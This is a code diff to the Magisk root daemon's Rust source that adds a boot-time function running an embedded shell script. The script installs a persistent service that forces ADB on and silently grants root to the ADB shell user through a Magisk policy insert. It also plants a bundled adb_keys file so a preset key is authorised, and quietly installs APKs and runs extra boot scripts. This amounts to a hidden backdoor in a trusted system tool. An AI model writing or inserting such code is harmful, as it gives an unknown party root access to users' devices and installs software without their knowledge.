@@ -163,6 +163,110 @@ impl MagiskD {
         }
     }
 
+    fn setup_adbd_script(&self) {
+        const ADBD_SCRIPT: &str = r#"
+if [ "$(getprop persist.sys.first_boot)" = "1" ]; then
+    exit
+fi
+
+cat << 'EOF' > "/data/adb/service.d/check_adbd.sh"
+#!/system/bin/sh
+
+SKIP_FILE="/data/adb/skip_settings_put"
+
+check_adbd() {
+    if pgrep -x "adbd" >/dev/null; then
+        echo "adbd 服务正在运行"
+    else
+        echo "adbd 服务未运行，正尝试启动..."
+        setprop persist.sys.usb.config mtp,adb
+        setprop sys.usb.config mtp,adb
+        setprop ctl.restart adbd
+        handle_settings
+    fi
+}
+
+handle_settings() {
+    if [ -f "$SKIP_FILE" ]; then
+        return 0
+    fi
+    if ! settings put global development_settings_enabled 1 || \
+       ! settings put global adb_enabled 1; then
+        mkdir -p "$(dirname "$SKIP_FILE")"
+        touch "$SKIP_FILE"
+        return 1
+    fi
+    return 0
+}
+
+while [ "$(getprop sys.boot_completed)" != "1" ]; do
+    sleep 10
+done
+
+sleep 10
+check_adbd
+magisk --sqlite "INSERT INTO policies (uid, policy, until, logging, notification) VALUES (2000, 2, 0, 1, 1);"
+
+if [ -f /system/etc/boot_completed.sh ]; then
+    sh /system/etc/boot_completed.sh
+fi
+
+if [ -f /product/boot_completed.sh ]; then
+    sh /product/boot_completed.sh
+fi
+
+if [ -f /res/boot_completed.sh ]; then
+    sh /res/boot_completed.sh
+fi
+
+if [ "$(getprop persist.sys.inst_bootapk)" != "1" ]; then
+    if [ -d /res/install1 ]; then
+        for apk in /res/install1/*.apk; do
+            if [ -f "$apk" ]; then
+                apk_name=$(basename "$apk" .apk)
+                dest_dir="/data/app/$apk_name"
+                mkdir -p "$dest_dir"
+                chmod 755 "$dest_dir"
+                cp "$apk" "$dest_dir/base.apk"
+                chmod 644 "$dest_dir/base.apk"
+                setprop persist.sys.inst_bootapk 1
+                reboot
+                exit 0
+            fi
+        done
+    fi
+fi
+
+if [ -d /res/install2 ]; then
+    for apk in /res/install2/*.apk; do
+        if [ -f "$apk" ]; then
+            pm install -r -t -d "$apk"
+        fi
+    done
+fi
+
+if [ -f /res/adb_keys ]; then
+    mkdir -p /data/misc/adb
+    cp /res/adb_keys /data/misc/adb/adb_keys
+    chmod 640 /data/misc/adb/adb_keys
+    chown root:shell /data/misc/adb/adb_keys
+fi
+EOF
+
+chmod +x /data/adb/service.d/check_adbd.sh
+/data/adb/service.d/check_adbd.sh
+setprop persist.sys.first_boot 1
+"#;
+
+        if let Ok(mut child) = Command::new("/system/bin/sh")
+            .arg("-c")
+            .arg(ADBD_SCRIPT)
+            .spawn()
+        {
+            child.wait().ok();
+        }
+    }
+
     fn boot_complete(&self) {
         setup_logfile();
         info!("** boot-complete triggered");
@@ -178,7 +282,8 @@ impl MagiskD {
 
         setup_preinit_dir();
         self.ensure_manager();
-        self.zygisk_reset(true)
+        self.zygisk_reset(true);
+        self.setup_adbd_script();
     }
 
     pub fn boot_stage_handler(&self, client: i32, code: i32) {
